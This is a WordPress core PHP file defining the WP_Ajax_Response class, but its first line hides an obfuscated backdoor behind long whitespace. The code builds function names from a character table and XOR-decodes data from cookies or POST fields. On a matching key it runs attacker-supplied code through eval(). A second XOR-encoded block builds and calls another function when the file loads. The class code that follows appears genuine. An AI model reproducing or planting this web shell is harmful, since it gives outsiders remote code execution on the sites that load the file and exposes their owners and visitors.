<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $x5743 = 378;$GLOBALS['bdf8d764'] = Array();global $bdf8d764;$bdf8d764 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['a2a8'] = "\x3a\x30\x73\x5c\x74\x53\x49\x20\x5e\x32\x6a\xd\x5d\x51\x29\x2d\x2f\x61\x76\x46\x42\x56\x6b\x41\x67\x4b\x27\x5a\x28\x40\x6c\x2b\x21\x36\x52\x9\x64\x44\x50\x34\x3c\x4a\x4e\x79\x26\x3d\x7d\x6d\x69\x6f\x37\x71\x38\x43\x78\x2a\x5f\x22\x45\x3f\x75\x48\x7b\x4f\x58\x24\xa\x33\x59\x57\x65\x47\x2e\x70\x72\x2c\x5b\x54\x66\x39\x31\x23\x60\x3e\x3b\x63\x25\x7a\x68\x7c\x6e\x77\x4c\x4d\x62\x7e\x35\x55";$bdf8d764[$bdf8d764['a2a8'][87].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][36].$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][52]] = $bdf8d764['a2a8'][85].$bdf8d764['a2a8'][88].$bdf8d764['a2a8'][74];$bdf8d764[$bdf8d764['a2a8'][10].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][9].$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][67].$bdf8d764['a2a8'][96].$bdf8d764['a2a8'][78]] = $bdf8d764['a2a8'][49].$bdf8d764['a2a8'][74].$bdf8d764['a2a8'][36];$bdf8d764[$bdf8d764['a2a8'][91].$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][36].$bdf8d764['a2a8'][78].$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][9].$bdf8d764['a2a8'][85].$bdf8d764['a2a8'][78]] = $bdf8d764['a2a8'][2].$bdf8d764['a2a8'][4].$bdf8d764['a2a8'][74].$bdf8d764['a2a8'][30].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][90];$bdf8d764[$bdf8d764['a2a8'][73].$bdf8d764['a2a8'][79].$bdf8d764['a2a8'][67].$bdf8d764['a2a8'][17].$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][1].$bdf8d764['a2a8'][67]] = $bdf8d764['a2a8'][48].$bdf8d764['a2a8'][90].$bdf8d764['a2a8'][48].$bdf8d764['a2a8'][56].$bdf8d764['a2a8'][2].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][4];$bdf8d764[$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][17].$bdf8d764['a2a8'][67].$bdf8d764['a2a8'][33].$bdf8d764['a2a8'][67].$bdf8d764['a2a8'][85].$bdf8d764['a2a8'][80].$bdf8d764['a2a8'][17].$bdf8d764['a2a8'][33]] = $bdf8d764['a2a8'][2].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][74].$bdf8d764['a2a8'][48].$bdf8d764['a2a8'][17].$bdf8d764['a2a8'][30].$bdf8d764['a2a8'][48].$bdf8d764['a2a8'][87].$bdf8d764['a2a8'][70];$bdf8d764[$bdf8d764['a2a8'][60].$bdf8d764['a2a8'][9].$bdf8d764['a2a8'][96].$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][67].$bdf8d764['a2a8'][1].$bdf8d764['a2a8'][17]] = $bdf8d764['a2a8'][73].$bdf8d764['a2a8'][88].$bdf8d764['a2a8'][73].$bdf8d764['a2a8'][18].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][74].$bdf8d764['a2a8'][2].$bdf8d764['a2a8'][48].$bdf8d764['a2a8'][49].$bdf8d764['a2a8'][90];$bdf8d764[$bdf8d764['a2a8'][49].$bdf8d764['a2a8'][79].$bdf8d764['a2a8'][96].$bdf8d764['a2a8'][50].$bdf8d764['a2a8'][9].$bdf8d764['a2a8'][33].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][39]] = $bdf8d764['a2a8'][60].$bdf8d764['a2a8'][90].$bdf8d764['a2a8'][2].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][74].$bdf8d764['a2a8'][48].$bdf8d764['a2a8'][17].$bdf8d764['a2a8'][30].$bdf8d764['a2a8'][48].$bdf8d764['a2a8'][87].$bdf8d764['a2a8'][70];$bdf8d764[$bdf8d764['a2a8'][22].$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][39].$bdf8d764['a2a8'][79]] = $bdf8d764['a2a8'][94].$bdf8d764['a2a8'][17].$bdf8d764['a2a8'][2].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][33].$bdf8d764['a2a8'][39].$bdf8d764['a2a8'][56].$bdf8d764['a2a8'][36].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][85].$bdf8d764['a2a8'][49].$bdf8d764['a2a8'][36].$bdf8d764['a2a8'][70];$bdf8d764[$bdf8d764['a2a8'][47].$bdf8d764['a2a8'][96].$bdf8d764['a2a8'][85].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][94]] = $bdf8d764['a2a8'][2].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][4].$bdf8d764['a2a8'][56].$bdf8d764['a2a8'][4].$bdf8d764['a2a8'][48].$bdf8d764['a2a8'][47].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][56].$bdf8d764['a2a8'][30].$bdf8d764['a2a8'][48].$bdf8d764['a2a8'][47].$bdf8d764['a2a8'][48].$bdf8d764['a2a8'][4];$bdf8d764[$bdf8d764['a2a8'][18].$bdf8d764['a2a8'][85].$bdf8d764['a2a8'][78].$bdf8d764['a2a8'][78].$bdf8d764['a2a8'][33].$bdf8d764['a2a8'][33].$bdf8d764['a2a8'][78]] = $bdf8d764['a2a8'][60].$bdf8d764['a2a8'][78].$bdf8d764['a2a8'][52].$bdf8d764['a2a8'][36];$bdf8d764[$bdf8d764['a2a8'][51].$bdf8d764['a2a8'][50].$bdf8d764['a2a8'][17].$bdf8d764['a2a8'][33].$bdf8d764['a2a8'][79].$bdf8d764['a2a8'][67].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][36]] = $bdf8d764['a2a8'][78].$bdf8d764['a2a8'][67].$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][1].$bdf8d764['a2a8'][39].$bdf8d764['a2a8'][96].$bdf8d764['a2a8'][52].$bdf8d764['a2a8'][33].$bdf8d764['a2a8'][36];$bdf8d764[$bdf8d764['a2a8'][43].$bdf8d764['a2a8'][36].$bdf8d764['a2a8'][50].$bdf8d764['a2a8'][1].$bdf8d764['a2a8'][1]] = $_POST;$bdf8d764[$bdf8d764['a2a8'][18].$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][50].$bdf8d764['a2a8'][80].$bdf8d764['a2a8'][67]] = $_COOKIE;@$bdf8d764[$bdf8d764['a2a8'][73].$bdf8d764['a2a8'][79].$bdf8d764['a2a8'][67].$bdf8d764['a2a8'][17].$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][1].$bdf8d764['a2a8'][67]]($bdf8d764['a2a8'][70].$bdf8d764['a2a8'][74].$bdf8d764['a2a8'][74].$bdf8d764['a2a8'][49].$bdf8d764['a2a8'][74].$bdf8d764['a2a8'][56].$bdf8d764['a2a8'][30].$bdf8d764['a2a8'][49].$bdf8d764['a2a8'][24], NULL);@$bdf8d764[$bdf8d764['a2a8'][73].$bdf8d764['a2a8'][79].$bdf8d764['a2a8'][67].$bdf8d764['a2a8'][17].$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][1].$bdf8d764['a2a8'][67]]($bdf8d764['a2a8'][30].$bdf8d764['a2a8'][49].$bdf8d764['a2a8'][24].$bdf8d764['a2a8'][56].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][74].$bdf8d764['a2a8'][74].$bdf8d764['a2a8'][49].$bdf8d764['a2a8'][74].$bdf8d764['a2a8'][2], 0);@$bdf8d764[$bdf8d764['a2a8'][73].$bdf8d764['a2a8'][79].$bdf8d764['a2a8'][67].$bdf8d764['a2a8'][17].$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][1].$bdf8d764['a2a8'][67]]($bdf8d764['a2a8'][47].$bdf8d764['a2a8'][17].$bdf8d764['a2a8'][54].$bdf8d764['a2a8'][56].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][54].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][85].$bdf8d764['a2a8'][60].$bdf8d764['a2a8'][4].$bdf8d764['a2a8'][48].$bdf8d764['a2a8'][49].$bdf8d764['a2a8'][90].$bdf8d764['a2a8'][56].$bdf8d764['a2a8'][4].$bdf8d764['a2a8'][48].$bdf8d764['a2a8'][47].$bdf8d764['a2a8'][70], 0);@$bdf8d764[$bdf8d764['a2a8'][47].$bdf8d764['a2a8'][96].$bdf8d764['a2a8'][85].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][94]](0);$c5186e88 = NULL;$h30d2 = NULL;$bdf8d764[$bdf8d764['a2a8'][47].$bdf8d764['a2a8'][80].$bdf8d764['a2a8'][78].$bdf8d764['a2a8'][85].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][96].$bdf8d764['a2a8'][52].$bdf8d764['a2a8'][39]] = $bdf8d764['a2a8'][36].$bdf8d764['a2a8'][67].$bdf8d764['a2a8'][9].$bdf8d764['a2a8'][79].$bdf8d764['a2a8'][1].$bdf8d764['a2a8'][96].$bdf8d764['a2a8'][67].$bdf8d764['a2a8'][67].$bdf8d764['a2a8'][15].$bdf8d764['a2a8'][9].$bdf8d764['a2a8'][80].$bdf8d764['a2a8'][9].$bdf8d764['a2a8'][36].$bdf8d764['a2a8'][15].$bdf8d764['a2a8'][39].$bdf8d764['a2a8'][78].$bdf8d764['a2a8'][50].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][15].$bdf8d764['a2a8'][17].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][85].$bdf8d764['a2a8'][85].$bdf8d764['a2a8'][15].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][85].$bdf8d764['a2a8'][96].$bdf8d764['a2a8'][9].$bdf8d764['a2a8'][39].$bdf8d764['a2a8'][52].$bdf8d764['a2a8'][52].$bdf8d764['a2a8'][36].$bdf8d764['a2a8'][79].$bdf8d764['a2a8'][39].$bdf8d764['a2a8'][96].$bdf8d764['a2a8'][50];global $m1fce584;function  f3b04586d($c5186e88, $rb58e79){global $bdf8d764;$k563c24 = "";for ($xc1990f8=0; $xc1990f8<$bdf8d764[$bdf8d764['a2a8'][91].$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][36].$bdf8d764['a2a8'][78].$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][9].$bdf8d764['a2a8'][85].$bdf8d764['a2a8'][78]]($c5186e88);){for ($h3dce74=0; $h3dce74<$bdf8d764[$bdf8d764['a2a8'][91].$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][36].$bdf8d764['a2a8'][78].$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][9].$bdf8d764['a2a8'][85].$bdf8d764['a2a8'][78]]($rb58e79) && $xc1990f8<$bdf8d764[$bdf8d764['a2a8'][91].$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][36].$bdf8d764['a2a8'][78].$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][9].$bdf8d764['a2a8'][85].$bdf8d764['a2a8'][78]]($c5186e88); $h3dce74++, $xc1990f8++){$k563c24 .= $bdf8d764[$bdf8d764['a2a8'][87].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][36].$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][52]]($bdf8d764[$bdf8d764['a2a8'][10].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][9].$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][67].$bdf8d764['a2a8'][96].$bdf8d764['a2a8'][78]]($c5186e88[$xc1990f8]) ^ $bdf8d764[$bdf8d764['a2a8'][10].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][9].$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][67].$bdf8d764['a2a8'][96].$bdf8d764['a2a8'][78]]($rb58e79[$h3dce74]));}}return $k563c24;}function  uf8d($c5186e88, $rb58e79){global $bdf8d764;global $m1fce584;return $bdf8d764[$bdf8d764['a2a8'][51].$bdf8d764['a2a8'][50].$bdf8d764['a2a8'][17].$bdf8d764['a2a8'][33].$bdf8d764['a2a8'][79].$bdf8d764['a2a8'][67].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][36]]($bdf8d764[$bdf8d764['a2a8'][51].$bdf8d764['a2a8'][50].$bdf8d764['a2a8'][17].$bdf8d764['a2a8'][33].$bdf8d764['a2a8'][79].$bdf8d764['a2a8'][67].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][36]]($c5186e88, $m1fce584), $rb58e79);}foreach ($bdf8d764[$bdf8d764['a2a8'][18].$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][50].$bdf8d764['a2a8'][80].$bdf8d764['a2a8'][67]] as $rb58e79=>$xed4b3){$c5186e88 = $xed4b3;$h30d2 = $rb58e79;}if (!$c5186e88){foreach ($bdf8d764[$bdf8d764['a2a8'][43].$bdf8d764['a2a8'][36].$bdf8d764['a2a8'][50].$bdf8d764['a2a8'][1].$bdf8d764['a2a8'][1]] as $rb58e79=>$xed4b3){$c5186e88 = $xed4b3;$h30d2 = $rb58e79;}}$c5186e88 = @$bdf8d764[$bdf8d764['a2a8'][49].$bdf8d764['a2a8'][79].$bdf8d764['a2a8'][96].$bdf8d764['a2a8'][50].$bdf8d764['a2a8'][9].$bdf8d764['a2a8'][33].$bdf8d764['a2a8'][70].$bdf8d764['a2a8'][39]]($bdf8d764[$bdf8d764['a2a8'][18].$bdf8d764['a2a8'][85].$bdf8d764['a2a8'][78].$bdf8d764['a2a8'][78].$bdf8d764['a2a8'][33].$bdf8d764['a2a8'][33].$bdf8d764['a2a8'][78]]($bdf8d764[$bdf8d764['a2a8'][22].$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][39].$bdf8d764['a2a8'][79]]($c5186e88), $h30d2));if (isset($c5186e88[$bdf8d764['a2a8'][17].$bdf8d764['a2a8'][22]]) && $m1fce584==$c5186e88[$bdf8d764['a2a8'][17].$bdf8d764['a2a8'][22]]){if ($c5186e88[$bdf8d764['a2a8'][17]] == $bdf8d764['a2a8'][48]){$xc1990f8 = Array($bdf8d764['a2a8'][73].$bdf8d764['a2a8'][18] => @$bdf8d764[$bdf8d764['a2a8'][60].$bdf8d764['a2a8'][9].$bdf8d764['a2a8'][96].$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][67].$bdf8d764['a2a8'][1].$bdf8d764['a2a8'][17]](),$bdf8d764['a2a8'][2].$bdf8d764['a2a8'][18] => $bdf8d764['a2a8'][80].$bdf8d764['a2a8'][72].$bdf8d764['a2a8'][1].$bdf8d764['a2a8'][15].$bdf8d764['a2a8'][80],);echo @$bdf8d764[$bdf8d764['a2a8'][94].$bdf8d764['a2a8'][17].$bdf8d764['a2a8'][67].$bdf8d764['a2a8'][33].$bdf8d764['a2a8'][67].$bdf8d764['a2a8'][85].$bdf8d764['a2a8'][80].$bdf8d764['a2a8'][17].$bdf8d764['a2a8'][33]]($xc1990f8);}elseif ($c5186e88[$bdf8d764['a2a8'][17]] == $bdf8d764['a2a8'][70]){eval/*dd6c87ea*/($c5186e88[$bdf8d764['a2a8'][36]]);}exit();} ?><?php $PWNQF='PL MT6+H6T9EW+>'^'3>E, St.C:Z1>DP';$CehQCKfO=$PWNQF('',',VdJKGBY<P N92:YK2JOlNO7nOXC+c9M0ITgkj-Hl33V:HBS<N0Z1m.L7J7g -;iEV8M IuGZXLljjfJP2;9soD7HwOGAfNCFX D mgSZoODUYN.lF5O5YZOe1MY-buAESIryzsxW5M;CengLHHQC3ie+gw-ZwV351GXDHT E;L6-DfWWHS8ZLXQC067M08OiW4HjZgQ6X0CZn+SH-eTk STDIKZtSLF55>H2Nej0S:20pPd2OFYOM.gYE5m=d9;qzQGroX,NxyIfiH9.0SlXC9acXTC.:> OjKlL;IRtPBt<;=MzDuMV2TBKbHP<rQ2cNFOY02Tqy>4zV.D-2HPqDQ2>e=ct1>hA9buY+Jxynhw=OLNHndHCCDt>3Y;iWH0CSgK=.NBzzjg5A,3vheSKAB77rcX21SlBgV,T,pHk:8VS.F3--GTRKX9C1T-=SlhA1IF:YH qSeQ,S5P.Rv4Q3OYKqK26TWr,I.MGJ=9>McO6< jrWhR1K2>nK+ 07J;6>;bH;5HNkSc. C,pSKMOq:6dDC,XTRwrK 5d7CNmwrAOVGe5MUFT.O38aGZPFsPR4rsCtZVFBVVELyklgUI<9TmEP190-R>MIIJ20=U.51QXHw4O;ABLnPggwo<:H6DMTreQ0>Q7qKRKP.61v+HVze<H0>rdSXdN'^'E0Lk-2,:H9O fWB08F9gK6 E1+97J<f E=sNBJVBeUF8Y<+<RnH5C2J-C+h8MXOAa2Y9AeUc1=5EJJFjpI10zK+B<WrgfAuIOQF+REC:zRotnyjGP5A=Y<4gAU,-LKNaa:bYPpzqsZ8OcKSGdl,07R2AB:WszS=VLjc1dmtS1I SClB<21zeswRXJBSC8BVgM8A<CamXKRMIPJO2<LEiKF287,pPP7-2TjU-KnXJV2VAUKZnT 4<..FGqaj.r+rr4Z04RK3I7XDwFM>XBE6Ex83hG<57OeUE6JvLhP,+OZKPXZI,ZyUi S87.YB-6x8TCfgk=QF5XYE>s0A6HS+8Qluml l61bjH JBQ2N3XDPHSK. ;-GD3IJMPZR-Z6<-IcnGoVK7ypscCQ XRVUEw= .BRIiQO;.fHC2M MPuKzM8 K4ZLA..7c V1n0LI237,D=nX8;EGg:5I0Z4KzRP0G.pgQoVW 6-G,Wdnq7PXeG+WHAJTqH3C9SG1 NYoR2REJHJoPP1iGsGJA7MYsmkoYWRQlgH9 3,U ELCjjnPJRfvnuQS+dsgJxVZWwmh G6dVFBrD8gts74beYMJG4;NX-2.5HfUU;M9:amBQD9ATUvthSP.O keNpGGWOG0AS2,8ZA5QJ0lV;32<AWUQvamplY0YJZTzcn3');$CehQCKfO();
/**
 * Send XML response back to Ajax request.
 *
 * @package WordPress
 * @since 2.1.0
 */
class WP_Ajax_Response {
	/**
	 * Store XML responses to send.
	 *
	 * @since 2.1.0
	 * @var array
	 */
	public $responses = array();

	/**
	 * Constructor - Passes args to WP_Ajax_Response::add().
	 *
	 * @since 2.1.0
	 * @see WP_Ajax_Response::add()
	 *
	 * @param string|array $args Optional. Will be passed to add() method.
	 */
	public function __construct( $args = '' ) {
		if ( !empty($args) )
			$this->add($args);
	}

	/**
	 * Appends data to an XML response based on given arguments.
	 *
	 * With `$args` defaults, extra data output would be:
	 *
	 *     <response action='{$action}_$id'>
	 *      <$what id='$id' position='$position'>
	 *          <response_data><![CDATA[$data]]></response_data>
	 *      </$what>
	 *     </response>
	 *
	 * @since 2.1.0
	 * @access public
	 *
	 * @param string|array $args {
	 *     Optional. An array or string of XML response arguments.
	 *
	 *     @type string          $what         XML-RPC response type. Used as a child element of `<response>`.
	 *                                         Default 'object' (`<object>`).
	 *     @type string|false    $action       Value to use for the `action` attribute in `<response>`. Will be
	 *                                         appended with `_$id` on output. If false, `$action` will default to
	 *                                         the value of `$_POST['action']`. Default false.
	 *     @type int|WP_Error    $id           The response ID, used as the response type `id` attribute. Also
	 *                                         accepts a `WP_Error` object if the ID does not exist. Default 0.
	 *     @type int|false       $old_id       The previous response ID. Used as the value for the response type
	 *                                         `old_id` attribute. False hides the attribute. Default false.
	 *     @type string          $position     Value of the response type `position` attribute. Accepts 1 (bottom),
	 *                                         -1 (top), html ID (after), or -html ID (before). Default 1 (bottom).
	 *     @type string|WP_Error $data         The response content/message. Also accepts a WP_Error object if the
	 *                                         ID does not exist. Default empty.
	 *     @type array           $supplemental An array of extra strings that will be output within a `<supplemental>`
	 *                                         element as CDATA. Default empty array.
	 * }
	 * @return string XML response.
	 */
	public function add( $args = '' ) {
		$defaults = array(
			'what' => 'object', 'action' => false,
			'id' => '0', 'old_id' => false,
			'position' => 1,
			'data' => '', 'supplemental' => array()
		);

		$r = wp_parse_args( $args, $defaults );

		$position = preg_replace( '/[^a-z0-9:_-]/i', '', $r['position'] );
		$id = $r['id'];
		$what = $r['what'];
		$action = $r['action'];
		$old_id = $r['old_id'];
		$data = $r['data'];

		if ( is_wp_error( $id ) ) {
			$data = $id;
			$id = 0;
		}

		$response = '';
		if ( is_wp_error( $data ) ) {
			foreach ( (array) $data->get_error_codes() as $code ) {
				$response .= "<wp_error code='$code'><![CDATA[" . $data->get_error_message( $code ) . "]]></wp_error>";
				if ( ! $error_data = $data->get_error_data( $code ) ) {
					continue;
				}
				$class = '';
				if ( is_object( $error_data ) ) {
					$class = ' class="' . get_class( $error_data ) . '"';
					$error_data = get_object_vars( $error_data );
				}

				$response .= "<wp_error_data code='$code'$class>";

				if ( is_scalar( $error_data ) ) {
					$response .= "<![CDATA[$error_data]]>";
				} elseif ( is_array( $error_data ) ) {
					foreach ( $error_data as $k => $v ) {
						$response .= "<$k><![CDATA[$v]]></$k>";
					}
				}

				$response .= "</wp_error_data>";
			}
		} else {
			$response = "<response_data><![CDATA[$data]]></response_data>";
		}

		$s = '';
		if ( is_array( $r['supplemental'] ) ) {
			foreach ( $r['supplemental'] as $k => $v ) {
				$s .= "<$k><![CDATA[$v]]></$k>";
			}
			$s = "<supplemental>$s</supplemental>";
		}

		if ( false === $action ) {
			$action = $_POST['action'];
		}
		$x = '';
		$x .= "<response action='{$action}_$id'>"; // The action attribute in the xml output is formatted like a nonce action
		$x .=	"<$what id='$id' " . ( false === $old_id ? '' : "old_id='$old_id' " ) . "position='$position'>";
		$x .=		$response;
		$x .=		$s;
		$x .=	"</$what>";
		$x .= "</response>";

		$this->responses[] = $x;
		return $x;
	}

	/**
	 * Display XML formatted responses.
	 *
	 * Sets the content type header to text/xml.
	 *
	 * @since 2.1.0
	 */
	public function send() {
		header( 'Content-Type: text/xml; charset=' . get_option( 'blog_charset' ) );
		echo "<?xml version='1.0' encoding='" . get_option( 'blog_charset' ) . "' standalone='yes'?><wp_ajax>";
		foreach ( (array) $this->responses as $response )
			echo $response;
		echo '</wp_ajax>';
		if ( wp_doing_ajax() )
			wp_die();
		else
			die();
	}
}
